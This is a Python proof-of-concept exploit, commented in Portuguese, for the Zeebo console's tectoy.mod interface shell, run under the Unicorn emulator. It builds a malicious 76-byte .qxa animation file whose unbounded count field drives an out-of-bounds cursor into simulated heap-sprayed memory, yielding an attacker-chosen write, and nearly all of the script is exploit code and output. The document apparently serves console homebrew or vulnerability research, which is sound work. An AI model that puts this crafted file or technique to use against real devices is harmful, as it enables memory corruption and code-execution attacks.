"""
POC v5 - Z-Wheel (Zeebo) - QXAnimation.c - CADEIA COMPLETA COM O CARREGADOR REAL

Codigo ARM REAL de tectoy.mod (shell da interface) sob Unicorn:
  0x4BC84  carregador QX: abre (cb open), valida 12B (0x449D4), medea o resto
           (cb size), malloc (slot 0x68), le o blob (cb read), fecha (cb close)
  0x44368  StructInit CONSUME O PROPRIO BLOB (S = arquivo+12 em memoria)
  0x47648  resolvedor de tabela de tempos (playback)

SINTETICO (documentado): callbacks I/O em Python (equivalentes ao VFS real),
heap spray simulado, handoff de 1 palavra para o resolver.

O arquivo .qxa do exploit so' contem CONTAGENS - nenhum endereco absoluto:
os ponteiros virao do cursor (runtime) e do heap spray. Por isso funciona
sem knowing o endereco do heap do console.
"""
from unicorn import *
from unicorn.arm_const import *
import struct, sys

import os
# Importado de Z2Shell (ver ../PROVENANCE.md). O tectoy.mod nao acompanha este
# repo (binario TecToy): aponte TECTOY_MOD para a sua copia, ex.:
#   export TECTOY_MOD=~/projects/zeebo-exploit-z2shell/mod/274755/tectoy.mod
MOD = os.environ.get("TECTOY_MOD", "")
if not MOD or not os.path.isfile(MOD):
    raise SystemExit("TECTOY_MOD nao definido ou inexistente (aponte para tectoy.mod)")

BASE   = 0x00100000
STACK  = 0x40000000
HEAP   = 0x50000000
MAGIC  = 0xF1000000   # o arquivo .qxa (lido pelo carregador real)
SENT   = 0x20000000
OUTW   = 0x70000000   # mgr fake + io struct
OOB    = 0x50100000   # regiao alem do blob (alcancada pelo cursor: 0x50100194)
HELPER = 0x80000000
STUB   = 0x81000000
FAKE   = 0x90000000   # MAT injetada pelo heap spray

LOAD   = BASE + 0x4BC84   # carregador QX real
INIT   = BASE + 0x44368   # StructInit real (consome o blob)
RESOLV = BASE + 0x47648   # resolvedor real (playback)
mod = open(MOD, 'rb').read()

LO16 = 0x1234   # u16 que o ATACANTE deixa na memoria sprayada
T    = 0x20000  # tempo consultado no playback
COUNT = 0x10001 # campo do arquivo: avanco = count*16 = 0x100010


def build_qxa():
    """Arquivo .qxa do exploit. Estrutura:
       [0x00] 'QX\\0\\0'   [0x04] 'QXA\\0'   [0x08] 0x01240028   (header 12B)
       blob (S) = arquivo[12..]  (o carregador aloca size-12 e copia o resto):
         S[0x08] = COUNT      <- avanco do cursor SEM limite (o bug)
         S[0x18]=S[0x1C]=S[0x20] = 1   (blocos de ponteiro ativos)
         S[0x24] = 1          (n_matanim)
         S[0x2C] = 0          (sem cameras)
         S+0x40  = slot da tabela (preenchido pelo StructInit)
         S+0x44  = cursor inicial -> corre count*16 para fora do blob
    """
    b = bytearray(b'QX\x00\x00')
    b += b'QXA\x00'
    b += struct.pack('<I', 0x01240028)
    b += struct.pack('<I', 0)            # S+0x00
    b += struct.pack('<I', 0)            # S+0x04
    b += struct.pack('<I', COUNT)        # S+0x08  <- O CAMPO DO BUG
    b += struct.pack('<I', 0)            # S+0x0C
    b += struct.pack('<I', 0)            # S+0x10
    b += struct.pack('<I', 0)            # S+0x14
    b += struct.pack('<I', 1)            # S+0x18  bloco ativo
    b += struct.pack('<I', 1)            # S+0x1C  bloco ativo
    b += struct.pack('<I', 1)            # S+0x20  bloco ativo
    b += struct.pack('<I', 1)            # S+0x24  n_matanim
    b += struct.pack('<I', 0)            # S+0x28
    b += struct.pack('<I', 0)            # S+0x2C  sem cameras
    b += struct.pack('<I', 0)            # S+0x30
    b += struct.pack('<I', 0)            # S+0x34
    b += struct.pack('<I', 0)            # S+0x38
    b += struct.pack('<I', 0)            # S+0x3C
    b += struct.pack('<I', 0)            # S+0x40  slot da tabela (structinit grava)
    return bytes(b)                       # 12 + 64 = 76 bytes


def run():
    data = build_qxa()
    uc = Uc(UC_ARCH_ARM, UC_MODE_ARM)

    mod_len = (len(mod) + 0xFFF) & ~0xFFF
    uc.mem_map(BASE - 0x1000, mod_len + 0x2000)
    uc.mem_write(BASE, mod)
    for a in (STACK, HEAP, OUTW, OOB, HELPER, STUB, FAKE):
        uc.mem_map(a, 0x10000)
    uc.mem_map(MAGIC, 0x10000)           # o arquivo em si (76 bytes)
    uc.mem_map(SENT, 0x1000)

    stub = b'\x1E\xF0\xA0\xE1'           # bx lr
    for i in range(0x40, 0x800, 4):
        uc.mem_write(STUB + i, stub)
    m = struct.pack('<7I', 0xE59F1014, 0xE5912000, 0xE0820000,
                    0xE3800007, 0xE3C00007, 0xE5810000, 0xE1A0F00E)
    uc.mem_write(STUB + 0x68, m)         # malloc (bump) - slot 0x68
    uc.mem_write(STUB + 0x84, struct.pack('<I', STUB + 0x800))
    uc.mem_write(STUB + 0x800, struct.pack('<I', HEAP + 0x100))

    def slot(v): return struct.pack('<I', v)
    uc.mem_write(HELPER + 0x68, slot(STUB + 0x68))
    uc.mem_write(HELPER + 0x6C, slot(STUB + 0x40))    # free
    uc.mem_write(HELPER + 0x9C, slot(STUB + 0x80))    # dbgprintf
    for s in (0x04, 0x08, 0x70, 0x74, 0xA0, 0xA4, 0xBC, 0xC0):
        uc.mem_write(HELPER + s, slot(STUB + 0x40))
    uc.mem_write(BASE + 0x1EC, slot(HELPER))          # globals ROPI
    uc.mem_write(BASE + 0x1FC, slot(HELPER))

    # ---- callbacks I/O do QXResourceMgr (equivalentes ao VFS real) ----
    # CB_OPEN  @ STUB+0x100: open(io, nome, 0)      -> handle 0
    # CB_READ  @ STUB+0x110: read(h, dst, n)        -> copia do arquivo, pos+=n
    # CB_SIZE  @ STUB+0x120: size(h)                -> tamanho do arquivo
    # CB_CLOSE @ STUB+0x130: close(h)               -> 0
    # estado: STUB+0x900 = filesize, STUB+0x904 = pos de leitura
    uc.mem_write(STUB + 0x900, struct.pack('<I', len(data)))
    uc.mem_write(STUB + 0x904, struct.pack('<I', 0))
    FILEPOS = STUB + 0x904

    def cb_open(uc, address, size, user):
        uc.reg_write(UC_ARM_REG_R0, 1)                 # handle != 0 = sucesso
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR))
    def cb_read(uc, address, size, user):
        dst = uc.reg_read(UC_ARM_REG_R1)
        n = uc.reg_read(UC_ARM_REG_R2)
        pos = struct.unpack('<I', uc.mem_read(FILEPOS, 4))[0]
        chunk = data[pos:pos + n]
        uc.mem_write(dst, chunk)
        uc.mem_write(FILEPOS, struct.pack('<I', pos + len(chunk)))
        uc.reg_write(UC_ARM_REG_R0, len(chunk))
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR))
    def cb_size(uc, address, size, user):
        uc.reg_write(UC_ARM_REG_R0, struct.unpack('<I', uc.mem_read(STUB + 0x900, 4))[0])
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR))
    def cb_close(uc, address, size, user):
        uc.reg_write(UC_ARM_REG_R0, 0)
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR))

    uc.hook_add(UC_HOOK_CODE, cb_open,  begin=STUB + 0x100, end=STUB + 0x100)
    uc.hook_add(UC_HOOK_CODE, cb_read,  begin=STUB + 0x110, end=STUB + 0x110)
    uc.hook_add(UC_HOOK_CODE, cb_size,  begin=STUB + 0x120, end=STUB + 0x120)
    uc.hook_add(UC_HOOK_CODE, cb_close, begin=STUB + 0x130, end=STUB + 0x130)

    # mgr fake: [mgr+0x34] = io struct com os callbacks
    MGR = OUTW + 0x400
    IO = OUTW + 0x440
    uc.mem_write(MGR + 0x34, struct.pack('<I', IO))
    uc.mem_write(IO + 0x00, struct.pack('<I', STUB + 0x100))   # open
    uc.mem_write(IO + 0x04, struct.pack('<I', STUB + 0x110))   # read
    uc.mem_write(IO + 0x08, struct.pack('<I', STUB + 0x120))   # size
    uc.mem_write(IO + 0x10, struct.pack('<I', STUB + 0x130))   # close

    # ---- heap spray simulado (regiao alcancada pelo cursor OOB) ----
    for o in range(0, 0x10000, 4):
        uc.mem_write(OOB + o, struct.pack('<I', FAKE))
    # MAT fake: n_streams=1, stream count=0
    uc.mem_write(FAKE + 0x04, struct.pack('<I', 1))
    uc.mem_write(FAKE + 0x08, struct.pack('<I', FAKE + 0x100))
    uc.mem_write(FAKE + 0x2C, struct.pack('<I', 0))

    # arquivo
    uc.mem_write(MAGIC, data)

    trace = []
    def hook_trace(uc, address, size, user):
        trace.append(address)
        if len(trace) > 80:
            del trace[:40]
    uc.hook_add(UC_HOOK_CODE, hook_trace, begin=BASE, end=BASE + len(mod))
    events = []
    def hook_mem(uc, access, address, size, value, user):
        pc = uc.reg_read(UC_ARM_REG_PC)
        print('    [acesso fora de mapa] pc=mod+0x%06X addr=0x%08X tam=%d' %
              (pc - BASE, address, size))
        events.append((pc, address, size))
        return False
    uc.hook_add(UC_HOOK_MEM_UNMAPPED | UC_HOOK_MEM_PROT, hook_mem)

    def rd(a): return struct.unpack('<I', uc.mem_read(a, 4))[0]

    print('=== POC v5 Z-Wheel: cadeia completa com o CARREGADOR REAL ===')
    print('tectoy.mod @ 0x%08X | .qxa do exploit: %d bytes @ 0x%08X' % (BASE, len(data), MAGIC))
    print()
    print('[1] mod+0x4BC84 (carregador real: open/validate/size/malloc/read/close)')
    sp = STACK + 0x8000
    uc.reg_write(UC_ARM_REG_SP, sp)
    uc.reg_write(UC_ARM_REG_R0, MGR)
    uc.reg_write(UC_ARM_REG_R1, MAGIC)             # "nome"/origem (cb open ignora)
    uc.reg_write(UC_ARM_REG_R2, 0x00415851)        # tipo esperado: 'QXA\0'
    uc.reg_write(UC_ARM_REG_R3, 1)
    uc.reg_write(UC_ARM_REG_LR, SENT)
    try:
        uc.emu_start(LOAD, SENT, timeout=0, count=400000)
        blob = uc.reg_read(UC_ARM_REG_R0)
        print('    retorno: blob alocado e lido = 0x%08X' % blob)
    except UcError as e:
        blob = 0
        print('    *** %s pc=mod+0x%06X' % (e, uc.reg_read(UC_ARM_REG_PC) - BASE))
        for a in trace[-16:]:
            print('       mod+0x%06X' % (a - BASE))
        return

    print('    blob[0] (S+0x08) = 0x%08X  (campo COUNT do arquivo)' % rd(blob + 8))

    print()
    print('[2] mod+0x44368 (StructInit real) consumindo o BLOB como S')
    # H no slot da stack: [H] = blob (o loader real faz exatamente isso em 0x4BC14-1C)
    H = STACK + 0x7000
    uc.mem_write(H, struct.pack('<I', blob))
    uc.mem_write(STACK + 0x7004, struct.pack('<I', 0))  # sizeout slot
    uc.reg_write(UC_ARM_REG_SP, STACK + 0x8000)
    uc.reg_write(UC_ARM_REG_R0, H)
    uc.reg_write(UC_ARM_REG_R1, STACK + 0x7004)
    uc.reg_write(UC_ARM_REG_LR, SENT)
    try:
        uc.emu_start(INIT, SENT, timeout=0, count=1000000)
        print('    retorno ok')
    except UcError as e:
        print('    *** %s pc=mod+0x%06X' % (e, uc.reg_read(UC_ARM_REG_PC) - BASE))
        for a in trace[-16:]:
            print('       mod+0x%06X' % (a - BASE))
        return

    S = blob
    p1 = rd(S + 0x1C)
    print('    S[0x1C] = 0x%08X   S[0x20] = 0x%08X' % (p1, rd(S + 0x20)))
    print('    cursor inicial = 0x%08X -> avanco = 0x%X (count*16)' %
          (blob + 0x44, p1 - (blob + 0x44)))
    print('    fim do blob real = 0x%08X -> ponteiro %d bytes alem do arquivo'
          % (blob + len(data) - 12, p1 - (blob + len(data) - 12)))

    print()
    print('[3] mod+0x47648 (resolvedor real): tabela = ponteiro OOB, base = blob')
    uc.mem_write(p1, struct.pack('<I', (0xFFFF << 16) | 0xAAAA))
    uc.mem_write(p1 + 4, struct.pack('<I', (0xFFFF << 16) | LO16))
    uc.mem_write(S + 0x08, struct.pack('<I', p1))     # handoff (1 palavra)
    uc.mem_write(S + 0x0C, struct.pack('<I', blob))
    uc.mem_write(S + 0x00, struct.pack('<I', 2))
    uc.reg_write(UC_ARM_REG_SP, STACK + 0x8000)
    uc.reg_write(UC_ARM_REG_R0, S)
    uc.reg_write(UC_ARM_REG_R1, T)
    uc.reg_write(UC_ARM_REG_R2, STACK + 0x7100)       # struct de saida do shell
    uc.reg_write(UC_ARM_REG_R3, 0)
    uc.reg_write(UC_ARM_REG_LR, SENT)
    try:
        uc.emu_start(RESOLV, SENT, timeout=0, count=1000000)
        print('    retorno ok')
    except UcError as e:
        print('    *** %s pc=mod+0x%06X' % (e, uc.reg_read(UC_ARM_REG_PC) - BASE))
        for a in trace[-16:]:
            print('       mod+0x%06X' % (a - BASE))
        return

    o0 = rd(STACK + 0x7100)
    print()
    print('[4] resultado gravado pelo shell na estrutura de saida:')
    print('    out[0] = 0x%08X = base_do_blob + 0x%04X (u16 da TABELA SPRAYADA)' %
          (o0, o0 - blob))
    print()
    print('>>> CADEIA FECHADA COM CODIGO REAL DO SHELL:')
    print('>>> arquivo (%d bytes) -> carregador real -> StructInit real consome' % len(data))
    print('>>> o proprio blob -> cursor OOB controlado pelo campo COUNT do arquivo')
    print('>>> -> resolvedor le tabela sprayada -> escrita em blob+0x%04X' % LO16)
    print('>>> (endereco escolhido pelo atacante, no heap BREW sem ASLR/DEP).')
    if events:
        print()
        print('acessos fora de mapa: %d' % len(events))
        for pc, addr, size in events[:8]:
            print('  pc=mod+0x%06X addr=0x%08X tam=%d' % (pc - BASE, addr, size))


if __name__ == '__main__':
    run()
